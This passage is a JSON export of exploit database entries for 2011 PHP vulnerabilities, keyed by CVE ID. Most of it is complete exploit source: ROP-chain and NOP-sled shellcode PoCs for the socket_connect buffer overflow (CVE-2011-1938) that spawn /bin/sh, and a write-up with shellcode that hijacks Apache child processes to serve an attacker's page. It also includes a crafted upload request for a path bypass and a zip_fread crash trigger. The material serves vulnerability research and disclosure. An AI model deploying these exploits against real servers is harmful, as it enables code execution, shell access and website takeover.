\"\\x23\\x26\\x07\\x08\"); // 0x08072623: pop %edi | pop %ebp | ret\r\ndefine('POP_EBX',   \"\\x0f\\x4d\\x21\\x08\"); // 0x08214d0f: pop %ebx | pop %esi | pop %edi | pop %ebp | ret\r\ndefine('XOR_ECX',   \"\\xe3\\x3b\\x1f\\x08\"); // 0x081f3be3: xor %ecx,%ecx | pop %ebx | mov %ecx,%eax | pop %esi | pop %edi | pop %ebp | ret\r\n\r\n$padd = str_repeat(\"A\", 196);\r\n\r\n$payload = POP_EDI.   // pop %edi\r\n           STACK.     // 0x874ba20\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           \"//bi\".    // pop %ebp\r\n           MOV_B_A.   // mov %ebp,%eax\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           POP_EDI.   // pop %edi\r\n           STACK4.    // 0x874ba24\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           \"n/sh\".    // pop %ebp\r\n           MOV_B_A.   // mov %ebp,%eax\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           POP_EDI.   // pop %edi\r\n           STACK8.    // 0x874ba28\r\n           DUMMY.     // pop %ebp\r\n           MOV_DI_DX. // mov %edi,%edx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           XOR_EAX.   // xor %eax,%eax\r\n           MOV_A_D.   // mov %eax,(%edx)\r\n           XOR_ECX.   // xor %ecx,%ecx\r\n           DUMMY.     // pop %ebx\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           POP_EBX.   // pop %ebx\r\n           STACK.     // 0x874ba20\r\n           DUMMY.     // pop %esi\r\n           DUMMY.     // pop %edi\r\n           DUMMY.     // pop %ebp\r\n           XOR_EAX.   // xor %eax,%eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INC_EAX.   // inc %eax\r\n           INT_80;    // int $0x80\r\n\r\n$evil = $padd.$payload;\r\n\r\n$fd   = socket_create(AF_UNIX, SOCK_STREAM, 1);\r\n$ret  = socket_connect($fd, $evil);\r\n?>\r\n\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:17486"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2011-07-03T00:00:00",
            "published": "2011-07-03T00:00:00",
            "href": "https://packetstormsecurity.com/files/102751/PHP-5.3.6-Buffer-Overflow.html",
            "id": "PACKETSTORM:102751",
            "type": "packetstorm",
            "title": "PHP 5.3.6 Buffer Overflow",
            "sourceData": "`<?php  \n/*  \n** Jonathan Salwan - @shell_storm  \n** http://shell-storm.org  \n** 2011-06-04  \n**  \n** http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1938  \n**  \n** Stack-based buffer overflow in the socket_connect function in ext/sockets/sockets.c  \n** in PHP 5.3.3 through 5.3.6 might allow context-dependent attackers to execute arbitrary  \n** code via a long pathname for a UNIX socket.  \n*/  \n  \necho \"[+] PHP 5.3.6 Buffer Overflow PoC (ROP)\\n\";  \necho \"[+] CVE-2011-1938\\n\\n\";  \n  \n# Gadgets in /usr/bin/php  \ndefine('DUMMY', \"\\x42\\x42\\x42\\x42\"); // padding  \ndefine('STACK', \"\\x20\\xba\\x74\\x08\"); // .data 0x46a0 0x874ba20  \ndefine('STACK4', \"\\x24\\xba\\x74\\x08\"); // STACK + 4  \ndefine('STACK8', \"\\x28\\xba\\x74\\x08\"); // STACK + 8  \ndefine('STACK12', \"\\x3c\\xba\\x74\\x08\"); // STACK + 12  \ndefine('INT_80', \"\\x27\\xb6\\x07\\x08\"); // 0x0807b627: int $0x80  \ndefine('INC_EAX', \"\\x66\\x50\\x0f\\x08\"); // 0x080f5066: inc %eax | ret  \ndefine('XOR_EAX', \"\\x60\\xb4\\x09\\x08\"); // 0x0809b460: xor %eax,%eax | ret  \ndefine('MOV_A_D', \"\\x84\\x3e\\x12\\x08\"); // 0x08123e84: mov %eax,(%edx) | ret  \ndefine('POP_EBP', \"\\xc7\\x48\\x06\\x08\"); // 0x080648c7: pop %ebp | ret  \ndefine('MOV_B_A', \"\\x18\\x45\\x06\\x08\"); // 0x08064518: mov %ebp,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret  \ndefine('MOV_DI_DX', \"\\x20\\x26\\x07\\x08\"); // 0x08072620: mov %edi,%edx | pop %esi | pop %edi | pop %ebp | ret  \ndefine('POP_EDI', \"\\x23\\x26\\x07\\x08\"); // 0x08072623: pop %edi | pop %ebp | ret  \ndefine('POP_EBX', \"\\x0f\\x4d\\x21\\x08\"); // 0x08214d0f: pop %ebx | pop %esi | pop %edi | pop %ebp | ret  \ndefine('XOR_ECX', \"\\xe3\\x3b\\x1f\\x08\"); // 0x081f3be3: xor %ecx,%ecx | pop %ebx | mov %ecx,%eax | pop %esi | pop %edi | pop %ebp | ret  \n  \n$padd = str_repeat(\"A\", 196);  \n  \n$payload = POP_EDI. // pop %edi  \nSTACK. // 0x874ba20  \nDUMMY. // pop %ebp  \nMOV_DI_DX. // mov %edi,%edx  \nDUMMY. // pop %esi  \nDUMMY. // pop %edi  \n\"//bi\". // pop %ebp  \nMOV_B_A. // mov %ebp,%eax  \nDUMMY. // pop %ebx  \nDUMMY. // pop %esi  \nDUMMY. // pop %edi  \nDUMMY. // pop %ebp  \nMOV_A_D. // mov %eax,(%edx)  \nPOP_EDI. // pop %edi  \nSTACK4. // 0x874ba24  \nDUMMY. // pop %ebp  \nMOV_DI_DX. // mov %edi,%edx  \nDUMMY. // pop %esi  \nDUMMY. // pop %edi  \n\"n/sh\". // pop %ebp  \nMOV_B_A. // mov %ebp,%eax  \nDUMMY. // pop %ebx  \nDUMMY. // pop %esi  \nDUMMY. // pop %edi  \nDUMMY. // pop %ebp  \nMOV_A_D. // mov %eax,(%edx)  \nPOP_EDI. // pop %edi  \nSTACK8. // 0x874ba28  \nDUMMY. // pop %ebp  \nMOV_DI_DX. // mov %edi,%edx  \nDUMMY. // pop %esi  \nDUMMY. // pop %edi  \nDUMMY. // pop %ebp  \nXOR_EAX. // xor %eax,%eax  \nMOV_A_D. // mov %eax,(%edx)  \nXOR_ECX. // xor %ecx,%ecx  \nDUMMY. // pop %ebx  \nDUMMY. // pop %esi  \nDUMMY. // pop %edi  \nDUMMY. // pop %ebp  \nPOP_EBX. // pop %ebx  \nSTACK. // 0x874ba20  \nDUMMY. // pop %esi  \nDUMMY. // pop %edi  \nDUMMY. // pop %ebp  \nXOR_EAX. // xor %eax,%eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINC_EAX. // inc %eax  \nINT_80; // int $0x80  \n  \n$evil = $padd.$payload;  \n  \n$fd = socket_create(AF_UNIX, SOCK_STREAM, 1);  \n$ret = socket_connect($fd, $evil);  \n?>  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:102751"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2011-05-26T00:00:00",
            "published": "2011-05-26T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20582",
            "id": "SSV:20582",
            "title": "PHP &lt;= 5.3.5 socket_connect() Buffer Overflow Vulnerability",
            "type": "seebug",
            "sourceData": "\n                                                &lt;?php\r\n// Credit: Mateusz Kocielski, Marek Kroemeke and Filip Palian\r\n// Affected Versions: 5.3.3-5.3.6\r\n \r\necho &quot;[+] CVE-2011-1938&quot;;\r\necho &quot;[+] there we go...\\n&quot;;\r\ndefine('EVIL_SPACE_ADDR', &quot;\\xff\\xff\\xee\\xb3&quot;);\r\ndefine('EVIL_SPACE_SIZE', 1024*1024*8);\r\n$SHELLCODE =\r\n        &quot;\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0&quot;.\r\n        &quot;\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1&quot;.\r\n        &quot;\\xcd\\x80&quot;;\r\necho &quot;[+] creating the sled.\\n&quot;;\r\n \r\n$CODE = str_repeat(&quot;\\x90&quot;, EVIL_SPACE_SIZE);\r\nfor ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;\r\n        $i &lt; strlen($SHELLCODE) ; $i++, $j++) {\r\n$CODE[$j] = $SHELLCODE[$i];\r\n}\r\n \r\n$b = str_repeat(&quot;A&quot;, 196).EVIL_SPACE_ADDR;\r\n$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);\r\necho &quot;[+] popping shell, have fun (if you picked the right address...)\\n&quot;;\r\n$var85 = socket_connect($var79,$b);\r\n?&gt;\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20582"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP <= 5.3.5 socket_connect() Buffer Overflow Vulnerability. CVE-2011-1938. Local exploits for multiple platform",
            "modified": "2011-05-25T00:00:00",
            "published": "2011-05-25T00:00:00",
            "id": "EDB-ID:17318",
            "href": "https://www.exploit-db.com/exploits/17318/",
            "type": "exploitdb",
            "title": "PHP <= 5.3.5 socket_connect Buffer Overflow Vulnerability",
            "sourceData": "<?php\r\n// Credit: Mateusz Kocielski, Marek Kroemeke and Filip Palian \r\n// Affected Versions: 5.3.3-5.3.6 \r\n\r\necho \"[+] CVE-2011-1938\";\r\necho \"[+] there we go...\\n\";\r\ndefine('EVIL_SPACE_ADDR', \"\\xff\\xff\\xee\\xb3\");\r\ndefine('EVIL_SPACE_SIZE', 1024*1024*8);\r\n$SHELLCODE = \r\n        \"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\".\r\n        \"\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\".\r\n        \"\\xcd\\x80\";\r\necho \"[+] creating the sled.\\n\";\r\n\r\n$CODE = str_repeat(\"\\x90\", EVIL_SPACE_SIZE);\r\nfor ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;\r\n        $i < strlen($SHELLCODE) ; $i++, $j++) {\r\n$CODE[$j] = $SHELLCODE[$i];\r\n}\r\n\r\n$b = str_repeat(\"A\", 196).EVIL_SPACE_ADDR;\r\n$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);\r\necho \"[+] popping shell, have fun (if you picked the right address...)\\n\";\r\n$var85 = socket_connect($var79,$b);\r\n?>",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:17318"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2011-05-25T00:00:00",
            "published": "2011-05-25T00:00:00",
            "href": "https://packetstormsecurity.com/files/101665/PHP-Socket-connect-Stack-Buffer-Overflow.html",
            "id": "PACKETSTORM:101665",
            "type": "packetstorm",
            "title": "PHP Socket connect() Stack Buffer Overflow",
            "sourceData": "`Hi there,  \n  \nThis is a quick writeup about some fun with apache based on CVE-2011-1938  \nthat was disclosed yesterday. While the first POC was literally just a  \ntrivial POC - the second one was written for self-educational purposes (we  \nleared quite a lot which is the most important thing) and we hope it might  \nbe useful for some other vulnerabilities of this/similar type.  \n  \nThis is an old fashioned stack buffer overflow in the socket module,  \nproblem occurs in the socket_connect. It uses memcpy to copy path from addr  \nto s_un without checking addr length in case when AF_UNIX socket is used.   \n  \nPOC popping a shell:  \n-- cut --  \n<?php  \necho \"[+] CVE-2011-1938\";  \necho \"[+] there we go...\\n\";  \ndefine('EVIL_SPACE_ADDR', \"\\xff\\xff\\xee\\xb3\");  \ndefine('EVIL_SPACE_SIZE', 1024*1024*8);  \n$SHELLCODE =   \n\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\".  \n\"\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\".  \n\"\\xcd\\x80\";  \necho \"[+] creating the sled.\\n\";  \n  \n$CODE = str_repeat(\"\\x90\", EVIL_SPACE_SIZE);  \nfor ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;  \n$i < strlen($SHELLCODE) ; $i++, $j++) {  \n$CODE[$j] = $SHELLCODE[$i];  \n}  \n  \n$b = str_repeat(\"A\", 196).EVIL_SPACE_ADDR;  \n$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);  \necho \"[+] popping shell, have fun (if you picked the right address...)\\n\";  \n$var85 = socket_connect($var79,$b);  \n?>  \n-- cut --  \n  \n  \n  \nTesting POC :  \n-- cut --  \ntest@Vdft02:/home/n1x0n# php ./kaka4.php   \n[+] there we go...  \n[+] creating the sled.  \n[+] popping shell, have fun.  \nPHP Warning: socket_connect(): unable to connect [22]: Invalid argument in   \n/home/n1x0n/kaka4.php on line 16  \nbash-4.1#   \n-- cut --  \n  \n  \nNow, popping a shell from a .php file that we just uploaded is quite lame  \nand boring isn't (yes you can use remote connect back with RFI etc..) it ?  \nInstead we decided to create a shellcode that will do something less common  \nand more appropriate to this particular type of vulnerability. As we pretty  \nmuch have a _full_ control over the apache child process and it's memory -  \nwe can do whatever we like with it. So one of the things that we considered  \nto be quite nifty was forcing apache child process to serve a page of our  \nchoice. Few problems appeared at this point : how apache handles  \nconnections, how to cleanly get back to apache from our shellcode, how to  \nkeep our handler in memory and respond to requests etc etc... and after few  \nlong nights of playing with this we managed to create a shellcode that  \nsimply \"infects\" the apache child process that handled connection to our  \n\"magic\" php script, and all new requests that will be handled by this child  \nwill return a page of our choice. We decided to create a simple apache  \nmodule, and use apache's built in functionality to generate  \ncontent(av_rputs), then to use mmap2 to keep our code in memory when our  \nshellcode leaves. Next step is to overwrite _hooks in apache and exit in a  \nneat way by signalling the process with SIGPROF thanks to which the signal  \nhandler cleans everything up behind us. So the main idea is to \"infect\"  \napache child process with our own code. If we do this several times - we  \ncan infect _all_ apache child processes effectively hijacking _all_  \nrequests comming into apache.  \n  \nThis is the result (obviously you need to guess/find few addresses due to  \nASLR like av_rputs & _handle ). Other protections will prevent this from  \nworking (like SSP,PIE and such).  \n  \n  \nBEFORE (everything works as expected):  \n-- cut --  \ntest@Vdft02:~# curl localhost  \n<html><body><h1>It works!</h1></body></html>  \ntest@Vdft02:~# curl http://localhost/this_does_not_exist  \n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">  \n<html><head>  \n<title>404 Not Found</title>  \n</head><body>  \n<h1>Not Found</h1>  \n<p>The requested URL /this_does_not_exist was not found on this server.</p>  \n</body></html>  \n-- cut --  \n  \nThen we call our magic file few times, you'll see the SIGPERF signal sent  \nby a shellcode (this is a good sign ;-P ) :  \n  \n-- cut --  \ntest@Vdft02:~# curl http://localhost/cz.php  \n<br />  \n<b>Warning</b>: socket_connect() [<a  \nhref='function.socket-connect'>function.socket-connect</a>]: unable to  \nconnect [9]: Bad file descriptor in <b>/test/apacz/a/htdocs/cz.php</b>   \non line <b>31</b><br />  \n<br />  \n<b>Fatal error</b>: Maximum execution time of 30 seconds exceeded in  \n<b>/test/apacz/a/htdocs/cz.php</b> on line <b>31</b><br />  \n-- cut --  \n  \n  \nThis has to be done several times so that we inject code to all child pids  \n(not going to add more spam here with all these requests) :  \n  \nfor i in $(seq 1 512) ; do curl http://localhost/cz.php ; done   \n  \n  \nAFTER:   \n-- cut --  \ntest@Vdft02:~# curl http://localhost/  \npwned  \ntest@Vdft02:~# curl http://localhost/does_not_exist  \npwned  \ntest@Vdft02:~# curl http://localhost/does_not_exist.php  \npwned  \ntest@Vdft02:~# curl http://localhost/does_not_exist.jpg   \npwned  \n-- cut --  \n  \n  \n  \n  \n  \nAnd this is the code with the infecting shellcode.  \n-- cut --  \n<?php  \n  \ndefine('EVIL_SPACE_ADDR', \"\\x00\\x00\\xff\\xb5\");  \ndefine('EVIL_SPACE_SIZE', 1024*1024*16);  \n$SHELLCODE =  \n\"\\x31\\xc9\\x31\\xd2\\x31\\xdb\\x66\\xb9\\x00\\x02\\x66\\xba\\x07\\x00\\xbe\\x22\".  \n\"\\x00\\x00\\x00\\xbf\\xff\\xff\\xff\\xff\\x31\\xed\\xb8\\xc0\\x00\\x00\\x00\\xcd\".  \n\"\\x80\\x89\\xc7\\x89\\xc3\\xeb\\x2d\\x5e\\xb9\\x00\\x02\\x00\\x00\\xf3\\xa4\\xb8\".  \n\"\\xc0\\xc2\\x0c\\x08\\x8b\\x40\\x14\\x8b\\x40\\x10\\x89\\x18\\x31\\xc0\\x31\\xdb\".  \n\"\\x31\\xc9\\x66\\xb8\\x14\\x00\\xcd\\x80\\x89\\xc3\\x66\\xb9\\x1b\\x00\\x66\\xb8\".  \n\"\\x25\\x00\\xcd\\x80\\xe8\\xce\\xff\\xff\\xff\\x55\\x89\\xe5\\x8b\\x5d\\x08\\x53\".  \n\"\\xeb\\x0e\\xb8\\x43\\xd3\\x06\\x08\\xff\\xd0\\x83\\xc4\\x08\\x31\\xc0\\xc9\\xc3\".  \n\"\\xe8\\xed\\xff\\xff\\xff\\x70\\x77\\x6e\\x65\\x64\\x0a\\x00\";  \n  \n/* allocate memory for shellcode */  \n$CODE = str_repeat(\"\\x90\", EVIL_SPACE_SIZE);  \nfor ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ; $i <  \nstrlen($SHELLCODE) ; $i++, $j++) {  \n$CODE[$j] = $SHELLCODE[$i];  \n}  \n  \n$b = str_repeat(EVIL_SPACE_ADDR,46);  \n  \n$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);  \n$var85 = socket_connect($var79,$b);  \n  \n?>  \n-- cut --  \n  \n  \nand above shellcode in a human readable form would be something along these  \nlines:  \n  \n  \n-- cut --  \nsection .text  \n  \n_start:  \n  \nxor ecx, ecx  \nxor edx, edx  \nxor ebx, ebx ; NULL  \nmov cx,0x200 ; 512 bytes   \nmov dx,0x7 ; PROT_READ|PROT_WRITE|PROT_EXEC  \nmov esi,0x22 ; MAP_PRIVATE|MAP_ANONYMOUS  \nmov edi,0xffffffff ; -1  \nxor ebp, ebp ;  \nmov eax,0xc0 ; mmap()  \nint 80h  \nmov edi, eax  \nmov ebx, eax  \njmp short handler  \nnext_3:  \npop esi  \nmov ecx, 0x200  \nrep movsb  \nmov eax, 0x80cc2c0  \nmov eax, [eax+0x14]  \nmov eax, [eax+0x10]  \nmov [eax], ebx  \n; kill(getpid(), SIGPROF)  \nxor eax, eax  \nxor ebx, ebx  \nxor ecx, ecx  \nmov ax, 20 ; getpid()  \nint 80h  \nmov ebx, eax ; pid  \nmov cx, 27 ; SIGPROF  \nmov ax, 37 ; kill()  \nint 80h  \n; not reached  \n  \nhandler:  \ncall near next_3  \npush ebp  \nmov ebp, esp  \nmov ebx, [ebp+8]  \npush ebx  \njmp short pwned  \nnext_2:  \nmov eax, 0xb4dc0d3d  \ncall eax  \nadd esp, 8  \nxor eax, eax  \nleave  \nret  \n  \npwned:  \ncall near next_2  \ndb \"pwned\",10,0  \n-- cut --  \n  \n  \nFound and exploited by:  \nMateusz (shm) Kocielski, Filip (s1m0n) Palian and Marek (n1x0n) Kroemeke  \n  \nBest regards,  \nMarek  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:101665"
        }
    ],
    "CVE-2011-2202": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.6 Security Bypass Vulnerability. CVE-2011-2202. Remote exploit for php platform",
            "modified": "2011-06-14T00:00:00",
            "published": "2011-06-14T00:00:00",
            "id": "EDB-ID:35855",
            "href": "https://www.exploit-db.com/exploits/35855/",
            "type": "exploitdb",
            "title": "PHP <= 5.3.6 Security Bypass Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/48259/info\r\n\r\nPHP is prone to a security-bypass vulnerability.\r\n\r\nSuccessful exploits will allow an attacker to create arbitrary files from the root directory, which may aid in further attacks.\r\n\r\nPHP 5.3.6 is vulnerable; other versions may also be affected.\r\n\r\nHTTP Request:\r\n====\r\nPOST /file-upload-fuzz/recv_dump.php HTTP/1.0\r\nhost: blog.security.localhost\r\ncontent-type: multipart/form-data; boundary=----------ThIs_Is_tHe_bouNdaRY_$\r\ncontent-length: 200\r\n\r\n------------ThIs_Is_tHe_bouNdaRY_$\r\nContent-Disposition: form-data; name=\"contents\"; filename=\"/anything.here.slash-will-pass\";\r\nContent-Type: text/plain\r\n\r\nany\r\n------------ThIs_Is_tHe_bouNdaRY_$--\r\n\r\nHTTP Response:\r\n====\r\nHTTP/1.1 200 OK\r\nDate: Fri, 27 May 2011 11:35:08 GMT\r\nServer: Apache/2.2.14 (Ubuntu)\r\nX-Powered-By: PHP/5.3.2-1ubuntu4.9\r\nContent-Length: 30\r\nConnection: close\r\nContent-Type: text/html\r\n\r\n/anything.here.slash-will-pass\r\n\r\nPHP script:\r\n=====\r\n<?php\r\nif (!empty($_FILES['contents'])) {  // process file upload\r\n    echo $_FILES['contents']['name'];\r\n    unlink($_FILES['contents']['tmp_name']);\r\n}\r\n",
            "cvss": {
                "score": 6.4,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35855"
        }
    ],
    "CVE-2011-1148": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 46843\r\nCVE ID: CVE-2011-1148\r\n\r\nPHP\u662f\u5e7f\u6cdb\u4f7f\u7528\u7684\u901a\u7528\u76ee\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7279\u522b\u9002\u5408\u4e8eWeb\u5f00\u53d1\uff0c\u53ef\u5d4c\u5165\u5230HTML\u4e2d\u3002\r\n\r\nPHP\u7684&quot;substr_replace()&quot;\u51fd\u6570\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u91ca\u653e\u540e\u91cd\u7528\u8fdc\u7a0b\u5185\u5b58\u7834\u574f\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u5728\u7f51\u7edc\u670d\u52a1\u5668\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\r\n\r\n\u6b64\u6f0f\u6d1e\u6e90\u4e8e\u5728\u5c06\u540c\u4e00\u4e2a\u53d8\u91cf\u591a\u6b21\u53d1\u9001\u5230&quot;substr_replace()&quot;\u51fd\u6570\u65f6\uff0cPHP\u4f1a\u4f7f\u8be5\u51fd\u6570\u4e2d\u7684\u4e09\u4e2a\u53d8\u91cf\u4f7f\u7528\u540c\u4e00\u4e2a\u6307\u9488\uff0c\u6240\u4ee5\u5f53\u51fd\u6570\u4e2d\u7684\u7c7b\u578b\u8f6c\u6362\u66f4\u6539\u4e86\u8be5\u6307\u9488\uff0c\u8be5\u6307\u9488\u4e5f\u4f1a\u4f7f\u5176\u4ed6\u53d8\u91cf\u65e0\u6548\u3002\n\nPHP PHP 5.3.x\r\nPHP PHP 5.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2011-03-18T00:00:00",
            "published": "2011-03-18T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20381",
            "id": "SSV:20381",
            "title": "PHP &quot;substr_replace()&quot;\u91ca\u653e\u540e\u91cd\u7528\u8fdc\u7a0b\u5185\u5b58\u7834\u574f\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20381"
        }
    ],
    "CVE-2011-1471": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 46975\r\nCVE ID: CVE-2011-1471\r\n\r\nPHP\u662f\u5e7f\u6cdb\u4f7f\u7528\u7684\u901a\u7528\u76ee\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7279\u522b\u9002\u5408\u4e8eWeb\u5f00\u53d1\uff0c\u53ef\u5d4c\u5165\u5230HTML\u4e2d\u3002\r\n\r\nPHP &quot;Zip&quot;\u6269\u5c55&quot;zip_fread()&quot;\u51fd\u6570\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u9020\u6210\u5e94\u7528\u7a0b\u5e8f\u5d29\u6e83\uff0c\u62d2\u7edd\u670d\u52a1\u548c\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\n\nMandrakeSoft Corporate Server 4.0 x86_64\r\nMandrakeSoft Corporate Server 4.0\r\nPHP PHP 5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2011-03-27T00:00:00",
            "published": "2011-03-27T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20390",
            "id": "SSV:20390",
            "title": "PHP &quot;Zip&quot;\u6269\u5c55&quot;zip_fread()&quot;\u51fd\u6570\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                \u63d0\u4f9b\u4e86\u5982\u4e0b\u6d4b\u8bd5\u65b9\u6cd5\uff1a\r\n\r\n&lt;?php\r\n$o = new ZipArchive();\r\nif (! $o-&gt;open('test.zip',ZipArchive::CHECKCONS)) {\r\n    exit ('error can\\'t open');\r\n}\r\n$o-&gt;getStream('file2'); // this file is ok\r\necho &quot;OK&quot;;\r\n$r = $o-&gt;getStream('file1'); // this file has a wrong crc\r\nwhile (! feof($r)) {\r\n    fread($r,1024);\r\n}\r\necho &quot;never here\\n&quot;;\r\n?&gt;\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20390"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.x 'Zip' Extension 'zip_fread()' Function Denial of Service Vulnerability. CVE-2011-1471. Dos exploit for php platform",
            "modified": "2011-03-10T00:00:00",
            "published": "2011-03-10T00:00:00",
            "id": "EDB-ID:35485",
            "href": "https://www.exploit-db.com/exploits/35485/",
            "type": "exploitdb",
            "title": "PHP 5.x - 'Zip' Extension 'zip_fread' Function Denial of Service Vulnerability",
